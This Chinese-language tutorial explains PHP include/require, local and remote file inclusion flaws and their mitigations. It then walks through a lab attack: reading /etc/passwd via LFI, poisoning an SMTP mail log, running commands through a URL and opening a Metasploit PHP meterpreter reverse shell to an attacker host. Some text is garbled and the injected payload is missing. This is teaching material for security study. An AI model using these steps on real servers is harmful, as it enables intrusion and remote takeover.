**输出内容：I have red BMW**
### PHP的require语句
我们知道，require语句也可以将一个文件包含到相应的PHP代码中。
但是，include和required语句之间的区别还是蛮大的；当PHP脚本通过include语句包含一个文件时，即使没有找到相应的文件，该脚本也会继续执行：  
**  
例3**
    Welcome to my home page!
**输出内容：I have red BMW**
如果换成require语句，该脚本就不会执行echo语句了，因为当require语句返回致命错误后，该脚本将会终止运行：
    Welcome to my home page!
**没有任何输出**
### PHP的required_once函数
当您可能多次包括某个文件时，可以使用函数require_once()，它的好处是只会包含一次，而不用担心重复包含。函数require_once和函数require_once之间的唯一区别，如果前者发现文件已经包含过一次，调用脚本将忽略其他的包含请求。
**例4**
    echo.php
    test.php
**输出内容：“Hello”**
注意：默认情况下，将会禁用allow_url_include。而如果allow_url_fopen被禁用，那么allow_url_include也随之被禁用。
我们可以通过修改php.ini文件来启用allow_url_include。
    /etc/php7/apache2/php.ini
    allow_url_include = On
### 文件包含攻击
利用这种攻击，攻击者可以通过PHP脚本在Web服务器上包含某些文件。当Web应用程序允许客户端将输入提交到文件，或将文件上传至服务器时，就会出现这种类型的漏洞。
该漏洞可能导致以下攻击：
  * 执行Web服务器中的代码
  * 跨站脚本攻击(XSS)
  * 拒绝服务攻击(DOS)
  * 数据操纵攻击
文件包含攻击分为两种类型：
  * 本地文件包含
  * 远程文件包含 
### 本地文件包含(LFI)
当PHP帐户访问的文件被作为参数传递给PHP函数“include”或“require_once”时，就会发出现本地文件包含漏洞。
例如，当页面接收到的参数是一个必须包含的文件路径，且参数中的内容没有进行正确的清理，从而允许插入目录遍历字符（如dot-dot-slash）时，就会出现这种漏洞。
示例——本地文件包含漏洞
    http://192.168.1.8/dvwa/vulnerabilities/fi/?page=file1.php
    http://192.168.1.8/dvwa/vulnerabilities/fi/?page=/etc/passwd
对于本地文件包含攻击的详细教程，请参阅[这里](https://www.hackingarticles.in/5-ways-exploit-lfi-vulnerability/ "这里")。
### 远程文件包含(RFI)
当位于不同服务器上的文件的URI作为参数传递给PHP函数“include”、“include_once”、“require”或“require_once”时，就会出现远程文件包含漏洞。因为PHP会将这些内容合并到页面中，并且，如果内容恰好是PHP源代码的话，PHP就会执行该文件。
通过包含PHP远程文件，攻击者就能够把自己的PHP代码嵌入到易受攻击的PHP脚本中，这可能导致灾难性的后果，例如，允许攻击者在Web服务器上执行远程命令、破坏Web的某些部分，甚至窃取机密信息。
    http://192.168.1.8/dvwa/vulnerabilities/fi/?page=file1.php
    http:// 192.168.1.8/dvwa/vulnerabilities/fi/?page=http://google.com
关于远程文件包含攻击的详细教程，请参阅这里。
### 缓解措施
  * 对输入内容进行严格的检查
  * 为可接受的输入内容设立白名单
  * 拒绝任何不严格符合规格的输入内容
  * 对于文件名，使用严格的白名单进行检测，同时，还要限制所用的字符集
  * 清除目录分隔符，如“/”
  * 为允许的文件扩展名设立白名单
  * 对于运行环境进行安全加固
  * 利用最新版本的PHP来开发和运行代码
  * 对PHP应用程序进行正确的设置，使其禁止使用register_globals
  * 将allow_url_fopen设置为false，以禁止包含来自远程位置的文件
  * 使用最低权限来运行代码
  * 使用已经过审核且没有包含这种漏洞的代码库或框架 
### 参考资料
  * 
  * 
  * 
## 从LFI到SMTP日志投毒到远程代码执行
下面，我们介绍如何利用含有本地文件包含漏洞的Web服务器，通过滥用SMTP服务来实现远程代码执行。
好了，让我们下手吧！！
首先，我们可以利用NMAP来扫描端口25，结果显示，端口25对SMTP服务是开放的。
    nmap -p25 192.168.1.107
该攻击的真正源头在于本地文件包含漏洞；因此，我创建了一个PHP文件，允许用户通过file参数来包含一个文件。
就像您看到的那样，这样就能够访问受害计算机的/etc/passwd文件了。
由于LFI攻击可以访问mail.log文件，也就是说，mail.log具有读写权限，那么，我们自然就可以通过注入恶意代码来感染日志文件了。
现在，让我们来枚举并连接到SMTP(25)端口。
    telnet 192.168.1.107 25
正如我们所看到的，我们成功地连接到了受害者的机器。现在，让我们尝试通过这台机器的命令行(CLI)发送邮件，并通过“rcpt
to”选项发送操作系统命令。实际上，当我们尝试连接Web服务器时，mail.log文件会为每封邮件生成相应的日志记录。利用这个特性，我们可以通过假冒的用户身份来发送恶意PHP代码，这时，它会作为新日志自动添加到mail.log文件中。
    MAIL FROM:
    RCPT TO:
注意：我们可以忽略服务器响应501 5.1.3 Bad recipient address
syntax（具体见上图），因为在理想情况下，该服务器（受害计算机）的内部电子邮件程序会期待我们输入电子邮件ID，而不是OS命令。
由于我们的目标是将PHP注入到日志中，因此，这个阶段可以称为日志文件中毒。在这里，我们可以清楚地看到mail.log的详细信息，以及cmd给出的执行注释；
现在，将ifconfig作为cmd注释来执行，以验证网络接口，并从通过屏幕输出内容来确认其执行结果。
    192.168.1.107/lfi/lfi.php?file=/var/log/mail.log &c=ifconfig
同时，还可以在源代码中观察其输出情况，具体如下图所示：
我们将其称为SMTP日志中毒漏洞，利用这种类型的漏洞，我们可以轻松地拿到受害者计算机的反向shell。
    use exploit/multi/script/web_delivery
    msf exploit (web_delivery)>set target 1
    msf exploit (web_delivery)> set payload php/meterpreter/reverse_tcp
    msf exploit (web_delivery)> set lhost 192.168.1.109
    msf exploit (web_delivery)>set srvport  8888
    msf exploit (web_delivery)>exploit
复制下面窗口中突出显示的文本
将上面复制的恶意代码粘贴到URL中，具体如图所示，并将其作为命令执行。
当执行上述代码时，攻击者就能获得目标Web服务器的Meterpreter会话了。
    msf exploit (web_delivery)>sessions 1
    meterpreter> sysinfo